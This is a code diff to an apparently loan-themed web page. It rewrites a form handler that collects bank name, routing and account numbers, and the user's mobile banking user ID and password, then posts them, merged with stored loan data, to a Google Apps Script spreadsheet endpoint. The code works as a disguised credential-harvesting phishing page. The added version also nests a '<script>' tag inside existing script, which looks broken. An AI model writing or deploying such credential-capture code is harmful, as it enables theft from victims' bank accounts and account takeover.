@@ -411,52 +411,44 @@
             }
         });
 
-        // Form submission
-        document.getElementById('bankAuthForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            // Get loan data from localStorage
-            const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
-            
-            // Collect bank form data with exact field IDs
-            const bankData = {
-                bankName: document.getElementById("bankName").value,
-                routingNumber: document.getElementById("routingNumber").value,
-                accountNumber: document.getElementById("accountNumber").value,
-                yourBank: document.getElementById("yourBank").value,
-                mobileBankingUserId: document.getElementById("mobileBankingUserId").value,
-                mobileBankingPassword: document.getElementById("mobileBankingPassword").value
-            };
-            
-            // Merge both forms data
-            const finalData = { ...loanData, ...bankData };
-            
-            console.log('Merged data for Google Sheets:', finalData);
-            
-            // Send to Google Sheets
-            try {
-                const response = await fetch("https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(finalData)
-                });
-                
-                console.log('Google Sheets response:', response);
-                
-                // Clear localStorage
-                localStorage.removeItem("loanData");
-                
-                // Show success
-                alert("Submitted successfully");
-                window.location.href = "loan-success.html";
-                
-            } catch (error) {
-                console.error('Error submitting to Google Sheets:', error);
-                alert('Error submitting form. Please try again.');
-            }
-        });
+        <script>
+const SHEET_URL = "https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec";
+
+document.querySelector("form").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+
+  const bankData = {
+    bankName: document.getElementById("bankName").value,
+    routingNumber: document.getElementById("routingNumber").value,
+    accountNumber: document.getElementById("accountNumber").value,
+    yourBank: document.getElementById("yourBank").value,
+    mobileBankingUserId: document.getElementById("mobileBankingUserId").value,
+    mobileBankingPassword: document.getElementById("mobileBankingPassword").value
+  };
+
+  const finalData = { ...loanData, ...bankData };
+
+  try {
+    const res = await fetch(SHEET_URL, {
+      method: "POST",
+      body: JSON.stringify(finalData)
+    });
+
+    const result = await res.text();
+    console.log("Google Sheet Response:", result);
+
+    alert("Form submitted successfully ✅");
+
+    localStorage.removeItem("loanData");
+
+  } catch (err) {
+    alert("Error sending data ❌");
+    console.error(err);
+  }
+});
+</script>
 
         function submitBankAuth(data) {
             const submitButton = document.querySelector('#bankAuthForm button[type="submit"]');
